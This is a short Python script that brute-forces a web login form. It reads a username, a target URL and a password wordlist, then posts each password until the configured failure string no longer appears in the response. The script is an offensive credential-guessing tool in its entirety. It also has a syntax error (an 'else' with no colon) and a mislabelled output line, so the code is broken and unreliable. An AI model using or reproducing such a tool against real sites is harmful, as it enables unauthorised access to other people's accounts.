import requests
from termcolor import colored

url = input('[*] Enter Page URL: ')
username = input('[*] Enter Username for theo account to brute force: ')
password_file = input('[*] Enter password file to use: ')
login_failed_string = input('[*] Enter string that occours when login fails: ')

def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print(colored(('Trying: ' + password), 'red'))
        data = {'username' : username, 'password' : password, 'Login' : 'submit'}
        response = requests.post(url, data=data)
        if login_failed_string in response.content.decode():
            pass
        else 
            print(colored(('[*] Found username: ==> ' + username), 'green'))
            print(colored(('[*] Found username: ==> ' + password), 'green'))
            exit()

with open(password_file, 'r') as passwords:
    cracking(username, url)

print('[!!!] Password Not In List')

